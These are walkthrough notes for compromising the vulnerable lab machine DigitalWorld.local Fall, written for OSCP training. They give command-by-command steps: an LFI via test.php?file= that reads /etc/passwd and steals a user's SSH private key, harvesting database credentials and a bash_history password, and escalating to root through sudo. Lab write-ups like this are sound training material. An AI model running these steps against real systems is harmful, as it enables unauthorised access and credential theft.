This video walkthrough, **"DigitalWorld.local - Fall - Walkthrough with S1REN,"** is a detailed demonstration of hacking a vulnerable machine relevant to the Offensive Security Certified Professional (OSCP) methodology.

The path to compromise involves initial enumeration, exploiting a Local File Inclusion (LFI) vulnerability to steal an SSH key, gaining a low-privileged shell, and finally, escalating privileges through a misconfigured `sudo` permission.

-----

## 📝 OSCP Walkthrough Notes: DigitalWorld.local - Fall

### Phase 1: Initial Enumeration and Scanning

| Goal | Command | Finding | Notes |
| :--- | :--- | :--- | :--- |
| **Full Port Scan & Service/OS Detection** | `nmap -p- -sC -sV -O <TARGET_IP> -T4 -oA fall_nmap` | **Ports Open:** 22 (SSH), 80 (HTTP - CMS Made Simple), 139/445 (SMB), 9090 (HTTP - Fedora Server Edition) | A comprehensive scan is crucial for identifying all potential attack vectors. |
| **SMB Share/User Enumeration** | `nmap -p139,445 --script=smb-enum-shares <TARGET_IP>` | **User Found:** `qiu` | Null sessions are permitted (`smb-enum-shares`), allowing the enumeration of a local user account. This is a critical finding for potential credential reuse or login attempts. |
| **Web Directory Fuzzing** | `dirbuster` or `wfuzz` against Port 80. | `index.php`, **`config.php`**, **`test.php`**, `robots.txt`, `uploads`, etc. | These files and directories are manually checked. The `test.php` file returns an error mentioning a "missing get parameter," which points toward a hidden file-handling function. |

-----

### Phase 2: Exploitation (LFI via Hidden Parameter)

| Goal | Command | Finding | Notes |
| :--- | :--- | :--- | :--- |
| **Hidden Parameter Discovery** | `wfuzz -c -z file,/path/to/param_names.txt http://<TARGET_IP>/test.php?FUZZ=1 -hh 80` | **Parameter:** `file` | The `wfuzz` tool is used to brute-force common parameter names, confirming that the page accepts a parameter named `file` and is therefore vulnerable to LFI. |
| **LFI to Retrieve `/etc/passwd`** | `curl http://<TARGET_IP>/test.php?file=/etc/passwd` | **User List Confirmed:** Confirms the existence of users like `root` and **`qiu`**. | This proves the LFI vulnerability and confirms the usernames found via SMB. |
| **LFI to Retrieve SSH Private Key** | `curl --insecure http://<TARGET_IP>/test.php?file=/home/qiu/.ssh/id_rsa` | **Private Key:** An SSH private key for the user `qiu` is exfiltrated. | By using the LFI, the user's private key is read from the filesystem. |
| **Setup Private Key for SSH** | 1. `touch id_rsa` (Save the key content) <br> 2. **`chmod 600 id_rsa`** | Key is ready to use. | The `chmod 600` command is **mandatory** for SSH, as it requires the key to be unreadable by anyone but the owner. |

-----

### Phase 3: Low-Privilege Shell and Local Enumeration

| Goal | Command | Finding | Notes |
| :--- | :--- | :--- | :--- |
| **Gain Shell** | **`ssh -i id_rsa qiu@<TARGET_IP>`** | Low-privileged shell as **`qiu`**. | Initial foothold is established. |
| **Internal Service Discovery** | `netstat -natp` | **Local MySQL:** Port 3306 is listening on `127.0.0.1` (localhost). | This service is only accessible from the local machine, making it a key target for privilege escalation via pivoting or local interaction. |
| **Credential Retrieval (Web App)** | **`cat /var/www/html/config.php`** | **Database Credentials:** Username/Password for the `cmsdb` database (e.g., `cms_user` and password). | CMS configuration files are a common place to find database credentials. |
| **MySQL Database Access** | `mysql -u cms_user -p` (Use retrieved password) | Access to `cmsdb` is successful. | The database is used to dump hashes for all web application users (`qiu` and `patrick`). |

-----

### Phase 4: Privilege Escalation

| Goal | Command | Finding | Notes |
| :--- | :--- | :--- | :--- |
| **Discover User's Password** | **`cat ~/.bash_history`** | **Cleartext Password Found\!** (The password for `qiu` is in the history file, likely from a previous login/su attempt). | This is a highly realistic misconfiguration where a user or admin may have typed a sensitive command directly into the shell. |
| **Check Sudo Privileges** | **`sudo -l`** (Enter the password found above) | **Flaw Found:** User `qiu` can run the command `su -` as root **without a password** (`(ALL) NOPASSWD: /usr/bin/su -`). | This is the final, fatal misconfiguration allowing the low-privileged user to become root. |
| **Final Root Command** | **`sudo su -`** | **Root Access\!** | Executes the authorized command to switch the user to root, completing the machine compromise. |

-----

### 🔑 Critical OSCP-Relevant Commands Summary

| Command | Purpose |
| :--- | :--- |
| `nmap -p- -sC -sV -O <IP>` | **Standard enumeration:** Full port scan with script and service/OS version detection. |
| `nmap --script=smb-enum-shares <IP>` | **SMB Enumeration:** Check for shares and potential user names via null sessions. |
| `wfuzz -z file,<wordlist> <URL>` | **Web Fuzzing:** Brute-force directories or hidden parameters. |
| `curl <URL>?file=/etc/passwd` | **Local File Inclusion (LFI):** Test the vulnerability by reading a known system file. |
| `chmod 600 id_rsa` | **SSH Key Permissions:** Set correct permissions for a private key to be usable. |
| `ssh -i id_rsa <user>@<IP>` | **SSH Login:** Use the compromised private key to gain a shell. |
| `netstat -natp` | **Pivoting Enumeration:** Discover services running on localhost (127.0.0.1) that are not accessible externally. |
| `cat ~/.bash_history` | **Lateral/Privilege Escalation:** A critical step to find reusable credentials or key commands. |
| **`sudo -l`** | **Privilege Check:** Find what commands the current user can run with elevated permissions. |
| **`sudo su -`** | **Final Root:** Execute the misconfigured NOPASSWD command to gain root access. |
http://googleusercontent.com/youtube_content/0